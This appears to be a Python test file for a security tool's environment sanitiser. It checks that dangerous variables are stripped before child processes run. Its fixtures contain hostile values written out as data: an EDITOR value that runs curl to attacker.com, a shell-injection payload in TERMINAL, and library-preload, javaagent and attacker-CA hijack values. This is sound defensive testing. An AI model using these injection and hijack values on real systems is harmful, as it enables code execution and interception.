"""Tests for Claude Code settings-based attack mitigations."""

import os
import sys
from pathlib import Path
from unittest.mock import patch


# core/security/tests/test_security_mitigations.py -> repo root
sys.path.insert(0, str(Path(__file__).parents[3]))

from core.config import RaptorConfig


class TestSafeEnv:
    """get_safe_env() strips dangerous environment variables."""

    def test_strips_terminal(self, tmp_path):
        # The value is a shell-injection payload — the test asserts the
        # whole var is stripped; the literal payload target lives under
        # tmp_path so the fixture stays hermetic.
        payload = f"xterm; touch {tmp_path / 'pwned'}"
        with patch.dict(os.environ, {"TERMINAL": payload}):
            env = RaptorConfig.get_safe_env()
            assert "TERMINAL" not in env

    def test_strips_editor(self):
        with patch.dict(os.environ, {"EDITOR": "vim$(curl attacker.com)"}):
            env = RaptorConfig.get_safe_env()
            assert "EDITOR" not in env

    def test_strips_visual(self):
        with patch.dict(os.environ, {"VISUAL": "code"}):
            env = RaptorConfig.get_safe_env()
            assert "VISUAL" not in env

    def test_strips_browser(self):
        with patch.dict(os.environ, {"BROWSER": "firefox"}):
            env = RaptorConfig.get_safe_env()
            assert "BROWSER" not in env

    def test_strips_pager(self):
        with patch.dict(os.environ, {"PAGER": "less"}):
            env = RaptorConfig.get_safe_env()
            assert "PAGER" not in env

    def test_strips_proxy_vars(self):
        with patch.dict(os.environ, {"HTTP_PROXY": "http://proxy:8080"}):
            env = RaptorConfig.get_safe_env()
            assert "HTTP_PROXY" not in env

    def test_preserves_path(self):
        env = RaptorConfig.get_safe_env()
        assert "PATH" in env

    def test_preserves_home(self):
        env = RaptorConfig.get_safe_env()
        assert "HOME" in env

    def test_strips_runtime_library_path_vars(self, tmp_path):
        """Library-path redirection vectors across runtimes must all be stripped.

        LD_PRELOAD, PYTHONPATH, NODE_PATH, etc. are the same class of attack
        as shell-eval env vars — a tainted env can inject arbitrary code
        into a sandboxed child via library resolution.
        """
        # Values are adversarial fixtures (what a tainted env would
        # contain). Test asserts each KEY is stripped — values are
        # never read. Per-test paths keep the fixtures hermetic.
        evil = tmp_path / "evil"
        dangerous = {
            "LD_PRELOAD": str(evil / "evil.so"),
            "LD_LIBRARY_PATH": str(tmp_path),
            "LD_AUDIT": str(evil / "audit.so"),
            "PYTHONPATH": str(evil),
            "PYTHONHOME": str(tmp_path),
            "PYTHONINSPECT": "1",
            "PYTHONSTARTUP": str(evil / "startup.py"),
            "PERL5OPT": "-Mevil",
            "PERLLIB": str(tmp_path),
            "PERL5LIB": str(tmp_path),
            "RUBYOPT": "-revil",
            "RUBYLIB": str(tmp_path),
            "NODE_OPTIONS": f"--require={evil}",
            "NODE_PATH": str(tmp_path),
        }
        with patch.dict(os.environ, dangerous):
            env = RaptorConfig.get_safe_env()
            for name in dangerous:
                assert name not in env, f"{name} leaked into safe env"

    def test_strips_tool_config_override_vars(self, tmp_path):
        """Tool-specific config-override vectors — each loads attacker code
        or weakens trust for a specific runtime / CLI tool. Allowlist-first
        catches them by default; this test pins the blocklist behaviour for
        callers who supply their own env= and rely on DANGEROUS_ENV_VARS
        being enforced as belt-and-braces.
        """
        # Values are adversarial fixtures (the test only asserts each
        # KEY is stripped). Per-test paths keep them hermetic.
        evil = tmp_path / "evil"
        ca = tmp_path / "attacker-ca.pem"
        dangerous = {
            "CLASSPATH": str(evil / "evil.jar"),
            "MAVEN_OPTS": f"-javaagent:{evil / 'evil.jar'}",
            "GRADLE_OPTS": f"-javaagent:{evil / 'evil.jar'}",
            "CARGO_HOME": str(evil / "cargo"),
            "GEM_HOME": str(evil / "gems"),
            "GEM_PATH": str(evil / "gems"),
            "BUNDLE_GEMFILE": str(evil / "Gemfile"),
            "PHPRC": str(evil / "evil.ini"),
            "PHP_INI_SCAN_DIR": str(evil),
            "GIT_EXEC_PATH": str(evil / "git-bin"),
            "GIT_TEMPLATE_DIR": str(evil / "template"),
            "EMACSLOADPATH": str(evil / "el"),
            "DOCKER_CONFIG": str(evil / "docker"),
            "DOCKER_HOST": "tcp://evil:2375",
            "REQUESTS_CA_BUNDLE": str(ca),
            "CURL_CA_BUNDLE": str(ca),
            "SSL_CERT_FILE": str(ca),
            "SSL_CERT_DIR": str(tmp_path / "attacker-ca-dir"),
        }
        with patch.dict(os.environ, dangerous):
            env = RaptorConfig.get_safe_env()
            for name in dangerous:
                assert name not in env, f"{name} leaked into safe env"


class TestLlmEnv:
    """get_llm_env() passes API keys that get_safe_env() blocks."""

    def test_safe_env_blocks_api_keys(self):
        with patch.dict(os.environ, {"ANTHROPIC_API_KEY": "sk-ant-test"}):
            env = RaptorConfig.get_safe_env()
            assert "ANTHROPIC_API_KEY" not in env

    def test_llm_env_passes_api_keys(self):
        keys = {
            "ANTHROPIC_API_KEY": "sk-ant-test",
            "OPENAI_API_KEY": "sk-test",
            "GEMINI_API_KEY": "AIza-test",
            "MISTRAL_API_KEY": "mist-test",
        }
        with patch.dict(os.environ, keys):
            env = RaptorConfig.get_llm_env()
            for name, val in keys.items():
                assert env.get(name) == val, f"{name} missing from llm env"

    def test_llm_env_omits_unset_keys(self, tmp_path):
        with patch.dict(os.environ, {}, clear=True):
            os.environ["PATH"] = "/usr/bin"
            # HOME just needs to point somewhere — some imports under
            # get_llm_env() consult it. Use a per-test scratch dir.
            os.environ["HOME"] = str(tmp_path)
            env = RaptorConfig.get_llm_env()
            for var in RaptorConfig.LLM_API_KEY_VARS:
                assert var not in env

    def test_llm_env_still_strips_dangerous(self, tmp_path):
        with patch.dict(os.environ, {"LD_PRELOAD": str(tmp_path / "evil.so"),
                                      "ANTHROPIC_API_KEY": "sk-ant-test"}):
            env = RaptorConfig.get_llm_env()
            assert "LD_PRELOAD" not in env
            assert env.get("ANTHROPIC_API_KEY") == "sk-ant-test"


# NOTE: `TestCheckRepoClaudeSettings` was removed — the function
# `_check_repo_claude_settings` in raptor_agentic.py was superseded by
# `check_repo_claude_trust` in `core/security/cc_trust.py` (PR #185).
# Coverage for the new API lives in `core/security/tests/test_cc_trust.py`.


class TestRepoDefault:
    """--repo defaults to RAPTOR_CALLER_DIR."""

    def test_env_var_used_as_default(self, tmp_path):
        """argparse picks up RAPTOR_CALLER_DIR when --repo not specified."""
        with patch.dict(os.environ, {"RAPTOR_CALLER_DIR": str(tmp_path)}):
            default = os.environ.get("RAPTOR_CALLER_DIR")
            assert default == str(tmp_path)

    def test_env_var_not_set_gives_none(self):
        env = os.environ.copy()
        env.pop("RAPTOR_CALLER_DIR", None)
        with patch.dict(os.environ, env, clear=True):
            assert os.environ.get("RAPTOR_CALLER_DIR") is None
